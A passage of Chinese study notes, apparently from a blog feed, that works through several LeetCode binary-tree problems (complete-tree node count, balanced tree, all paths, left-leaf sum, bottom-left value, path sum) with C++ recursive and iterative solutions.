    <content type="html"><![CDATA[<p>本文为学习<ahref="https://programmercarl.com/">代码随想录</a>时所做的笔记，仅供学习参考，不做任何商业用途，若有侵权，请联系删除。</p><h1 id="完全二叉树的节点个数">完全二叉树的节点个数</h1><p><ahref="https://leetcode.cn/problems/count-complete-tree-nodes/">222.完全二叉树的节点个数 - 力扣（LeetCode）</a></p><p>在完全二叉树中，除了最底层节点可能没填满外，其余每层节点数都达到最大值，并且最下面一层的节点都集中在该层最左边的若干位置。若最底层为第h 层，则该层包含 1~ 2^(h-1) 个节点。</p><span id="more"></span><p>完全二叉树只有两种情况，情况一：就是满二叉树，情况二：最后一层叶子节点没有满。</p><p>对于情况一，可以直接用 2^树深度 - 1来计算，注意这里根节点深度为1。</p><p>对于情况二，分别递归左孩子，和右孩子，递归到某一深度一定会有左孩子或者右孩子为满二叉树，然后依然可以按照情况1来计算。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countNodes</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        TreeNode* left = root-&gt;left;<br>        TreeNode* right = root-&gt;right;<br>        <span class="hljs-type">int</span> leftDepth = <span class="hljs-number">0</span>, rightDepth = <span class="hljs-number">0</span>; <span class="hljs-comment">// 这里初始为0是有目的的，为了下面求指数方便</span><br>        <span class="hljs-keyword">while</span> (left) &#123;  <span class="hljs-comment">// 求左子树深度</span><br>            left = left-&gt;left;<br>            leftDepth++;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (right) &#123; <span class="hljs-comment">// 求右子树深度</span><br>            right = right-&gt;right;<br>            rightDepth++;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (leftDepth == rightDepth) &#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-number">2</span> &lt;&lt; leftDepth) - <span class="hljs-number">1</span>; <span class="hljs-comment">// 注意(2&lt;&lt;1) 相当于2^2，所以leftDepth初始为0</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">countNodes</span>(root-&gt;left) + <span class="hljs-built_in">countNodes</span>(root-&gt;right) + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="平衡二叉树">平衡二叉树</h1><p><a href="https://leetcode.cn/problems/balanced-binary-tree/">110.平衡二叉树 - 力扣（LeetCode）</a></p><ul><li>二叉树节点的深度：指从根节点到该节点的最长简单路径边的条数。</li><li>二叉树节点的高度：指从该节点到叶子节点的最长简单路径边的条数。</li></ul><h2 id="递归">递归</h2><ol type="1"><li><p>明确递归函数的参数和返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// -1 表示已经不是平衡二叉树了，否则返回值是以该节点为根节点树的高度</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getHeight</span><span class="hljs-params">(TreeNode* node)</span></span><br></code></pre></td></tr></table></figure></li><li><p>明确终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (node == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>明确单层递归的逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> leftHeight = <span class="hljs-built_in">getHeight</span>(node-&gt;left); <span class="hljs-comment">// 左</span><br><span class="hljs-keyword">if</span> (leftHeight == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> rightHeight = <span class="hljs-built_in">getHeight</span>(node-&gt;right); <span class="hljs-comment">// 右</span><br><span class="hljs-keyword">if</span> (rightHeight == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-type">int</span> result;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">abs</span>(leftHeight - rightHeight) &gt; <span class="hljs-number">1</span>) &#123;  <span class="hljs-comment">// 中</span><br>    result = <span class="hljs-number">-1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    result = <span class="hljs-number">1</span> + <span class="hljs-built_in">max</span>(leftHeight, rightHeight); <span class="hljs-comment">// 以当前节点为根节点的树的最大高度</span><br>&#125;<br><br><span class="hljs-keyword">return</span> result;<br></code></pre></td></tr></table></figure></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 返回以该节点为根节点的二叉树的高度，如果不是平衡二叉树了则返回-1</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getHeight</span><span class="hljs-params">(TreeNode* node)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (node == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> leftHeight = <span class="hljs-built_in">getHeight</span>(node-&gt;left);<br>        <span class="hljs-keyword">if</span> (leftHeight == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        <span class="hljs-type">int</span> rightHeight = <span class="hljs-built_in">getHeight</span>(node-&gt;right);<br>        <span class="hljs-keyword">if</span> (rightHeight == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">abs</span>(leftHeight - rightHeight) &gt; <span class="hljs-number">1</span> ? <span class="hljs-number">-1</span> : <span class="hljs-number">1</span> + <span class="hljs-built_in">max</span>(leftHeight, rightHeight);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isBalanced</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getHeight</span>(root) == <span class="hljs-number">-1</span> ? <span class="hljs-literal">false</span> : <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二叉树的所有路径">二叉树的所有路径</h1><p><a href="https://leetcode.cn/problems/binary-tree-paths/">257.二叉树的所有路径 - 力扣（LeetCode）</a></p><h2 id="递归-1">递归</h2><ol type="1"><li><p>递归函数函数参数以及返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur, vector&lt;<span class="hljs-type">int</span>&gt;&amp; path, vector&lt;string&gt;&amp; result)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定递归终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (cur-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; cur-&gt;right == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-comment">// 终止处理逻辑</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (cur-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; cur-&gt;right == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-comment">// 遇到叶子节点</span><br>    string sPath;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; path.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i++) &#123; <span class="hljs-comment">// 将path里记录的路径转为string格式</span><br>        sPath += <span class="hljs-built_in">to_string</span>(path[i]);<br>        sPath += <span class="hljs-string">&quot;-&gt;&quot;</span>;<br>    &#125;<br>    sPath += <span class="hljs-built_in">to_string</span>(path[path.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>]); <span class="hljs-comment">// 记录最后一个节点（叶子节点）</span><br>    result.<span class="hljs-built_in">push_back</span>(sPath); <span class="hljs-comment">// 收集一个路径</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (cur-&gt;left) &#123;<br>    <span class="hljs-built_in">traversal</span>(cur-&gt;left, path, result);<br>    path.<span class="hljs-built_in">pop_back</span>(); <span class="hljs-comment">// 回溯</span><br>&#125;<br><span class="hljs-keyword">if</span> (cur-&gt;right) &#123;<br>    <span class="hljs-built_in">traversal</span>(cur-&gt;right, path, result);<br>    path.<span class="hljs-built_in">pop_back</span>(); <span class="hljs-comment">// 回溯</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 版本一</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur, vector&lt;<span class="hljs-type">int</span>&gt;&amp; path, vector&lt;string&gt;&amp; result)</span> </span>&#123;<br>        path.<span class="hljs-built_in">push_back</span>(cur-&gt;val); <span class="hljs-comment">// 中，中为什么写在这里，因为最后一个节点也要加入到path中 </span><br>        <span class="hljs-comment">// 这才到了叶子节点</span><br>        <span class="hljs-keyword">if</span> (cur-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; cur-&gt;right == <span class="hljs-literal">NULL</span>) &#123;<br>            string sPath;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; path.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i++) &#123;<br>                sPath += <span class="hljs-built_in">to_string</span>(path[i]);<br>                sPath += <span class="hljs-string">&quot;-&gt;&quot;</span>;<br>            &#125;<br>            sPath += <span class="hljs-built_in">to_string</span>(path[path.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>]);<br>            result.<span class="hljs-built_in">push_back</span>(sPath);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (cur-&gt;left) &#123; <span class="hljs-comment">// 左 </span><br>            <span class="hljs-built_in">traversal</span>(cur-&gt;left, path, result);<br>            path.<span class="hljs-built_in">pop_back</span>(); <span class="hljs-comment">// 回溯</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (cur-&gt;right) &#123; <span class="hljs-comment">// 右</span><br>            <span class="hljs-built_in">traversal</span>(cur-&gt;right, path, result);<br>            path.<span class="hljs-built_in">pop_back</span>(); <span class="hljs-comment">// 回溯</span><br>        &#125;<br>    &#125;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">binaryTreePaths</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        vector&lt;string&gt; result;<br>        vector&lt;<span class="hljs-type">int</span>&gt; path;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> result;<br>        <span class="hljs-built_in">traversal</span>(root, path, result);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="左叶子之和">左叶子之和</h1><p><a href="https://leetcode.cn/problems/sum-of-left-leaves/">404.左叶子之和 - 力扣（LeetCode）</a></p><h2 id="递归法">递归法</h2><ol type="1"><li><p>确定递归函数的参数和返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sumOfLeftLeaves</span><span class="hljs-params">(TreeNode* root)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归的逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> leftValue = <span class="hljs-built_in">sumOfLeftLeaves</span>(root-&gt;left);<br><span class="hljs-keyword">if</span> (root-&gt;left &amp;&amp; !root-&gt;left-&gt;left &amp;&amp; !root-&gt;left-&gt;right) &#123;<br>leftValue = root-&gt;left-&gt;val;<br>&#125;<br><span class="hljs-type">int</span> rightValue = <span class="hljs-built_in">sumOfLeftLeaves</span>(root-&gt;right);<br><span class="hljs-type">int</span> sum = leftValue + rightValue;<br><span class="hljs-keyword">return</span> sum;<br></code></pre></td></tr></table></figure></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sumOfLeftLeaves</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;right== <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-type">int</span> leftValue = <span class="hljs-built_in">sumOfLeftLeaves</span>(root-&gt;left);    <span class="hljs-comment">// 左</span><br>        <span class="hljs-keyword">if</span> (root-&gt;left &amp;&amp; !root-&gt;left-&gt;left &amp;&amp; !root-&gt;left-&gt;right) &#123; <span class="hljs-comment">// 左子树就是一个左叶子的情况</span><br>            leftValue = root-&gt;left-&gt;val;<br>        &#125;<br>        <span class="hljs-type">int</span> rightValue = <span class="hljs-built_in">sumOfLeftLeaves</span>(root-&gt;right);  <span class="hljs-comment">// 右</span><br><br>        <span class="hljs-type">int</span> sum = leftValue + rightValue;               <span class="hljs-comment">// 中</span><br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="迭代法">迭代法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sumOfLeftLeaves</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        stack&lt;TreeNode*&gt; st;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        st.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>()) &#123;<br>            TreeNode* node = st.<span class="hljs-built_in">top</span>();<br>            st.<span class="hljs-built_in">pop</span>();<br>            <span class="hljs-keyword">if</span> (node-&gt;left != <span class="hljs-literal">NULL</span> &amp;&amp; node-&gt;left-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; node-&gt;left-&gt;right == <span class="hljs-literal">NULL</span>) &#123;<br>                result += node-&gt;left-&gt;val;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (node-&gt;right) st.<span class="hljs-built_in">push</span>(node-&gt;right);<br>            <span class="hljs-keyword">if</span> (node-&gt;left) st.<span class="hljs-built_in">push</span>(node-&gt;left);<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="找树左下角的值">找树左下角的值</h1><p><ahref="https://leetcode.cn/problems/find-bottom-left-tree-value/">513.找树左下角的值 - 力扣（LeetCode）</a></p><h2 id="递归-2">递归</h2><ol type="1"><li><p>确定递归函数的参数和返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> maxDepth = INT_MIN;   <span class="hljs-comment">// 全局变量 记录最大深度</span><br><span class="hljs-type">int</span> result;       <span class="hljs-comment">// 全局变量 最大深度最左节点的数值</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> depth)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">if</span> (depth &gt; maxDepth) &#123;<br>        maxDepth = depth;           <span class="hljs-comment">// 更新最大深度</span><br>        result = root-&gt;val;   <span class="hljs-comment">// 最大深度最左面的数值</span><br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>确定单层循环</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp">                    <span class="hljs-comment">// 中</span><br><span class="hljs-keyword">if</span> (root-&gt;left) &#123;   <span class="hljs-comment">// 左</span><br>    depth++; <span class="hljs-comment">// 深度加一</span><br>    <span class="hljs-built_in">traversal</span>(root-&gt;left, depth);<br>    depth--; <span class="hljs-comment">// 回溯，深度减一</span><br>&#125;<br><span class="hljs-keyword">if</span> (root-&gt;right) &#123; <span class="hljs-comment">// 右</span><br>    depth++; <span class="hljs-comment">// 深度加一</span><br>    <span class="hljs-built_in">traversal</span>(root-&gt;right, depth);<br>    depth--; <span class="hljs-comment">// 回溯，深度减一</span><br>&#125;<br><span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> maxDepth = INT_MIN;<br>    <span class="hljs-type">int</span> result;<br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> depth)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">NULL</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">if</span> (depth &gt; maxDepth) &#123;<br>                maxDepth = depth;<br>                result = root-&gt;val;<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (root-&gt;left) &#123;<br>            depth++;<br>            <span class="hljs-built_in">traversal</span>(root-&gt;left, depth);<br>            depth--; <span class="hljs-comment">// 回溯</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (root-&gt;right) &#123;<br>            depth++;<br>            <span class="hljs-built_in">traversal</span>(root-&gt;right, depth);<br>            depth--; <span class="hljs-comment">// 回溯</span><br>        &#125;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findBottomLeftValue</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-built_in">traversal</span>(root, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="迭代法-1">迭代法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findBottomLeftValue</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        queue&lt;TreeNode*&gt; que;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>) que.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (!que.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-type">int</span> size = que.<span class="hljs-built_in">size</span>();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++) &#123;<br>                TreeNode* node = que.<span class="hljs-built_in">front</span>();<br>                que.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) result = node-&gt;val; <span class="hljs-comment">// 记录最后一行第一个元素</span><br>                <span class="hljs-keyword">if</span> (node-&gt;left) que.<span class="hljs-built_in">push</span>(node-&gt;left);<br>                <span class="hljs-keyword">if</span> (node-&gt;right) que.<span class="hljs-built_in">push</span>(node-&gt;right);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="路径总和">路径总和</h1><p><a href="https://leetcode.cn/problems/path-sum/">112. 路径总和 -力扣（LeetCode）</a></p><h2 id="递归-3">递归</h2><ol type="1"><li><p>确定递归函数的参数和返回类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">traversal</span><span class="hljs-params">(treenode* cur, <span class="hljs-type">int</span> count)</span>   <span class="hljs-comment">// 注意函数的返回类型</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (!cur-&gt;left &amp;&amp; !cur-&gt;right &amp;&amp; count == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 遇到叶子节点，并且计数为0</span><br><span class="hljs-keyword">if</span> (!cur-&gt;left &amp;&amp; !cur-&gt;right) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 遇到叶子节点而没有找到合适的边，直接返回</span><br></code></pre></td></tr></table></figure></li><li><p>确定单层递归的逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (cur-&gt;left) &#123; <span class="hljs-comment">// 左</span><br>    count -= cur-&gt;left-&gt;val; <span class="hljs-comment">// 递归，处理节点;</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">traversal</span>(cur-&gt;left, count)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    count += cur-&gt;left-&gt;val; <span class="hljs-comment">// 回溯，撤销处理结果</span><br>&#125;<br><span class="hljs-keyword">if</span> (cur-&gt;right) &#123; <span class="hljs-comment">// 右</span><br>    count -= cur-&gt;right-&gt;val;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">traversal</span>(cur-&gt;right, count)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    count += cur-&gt;right-&gt;val;<br>&#125;<br><span 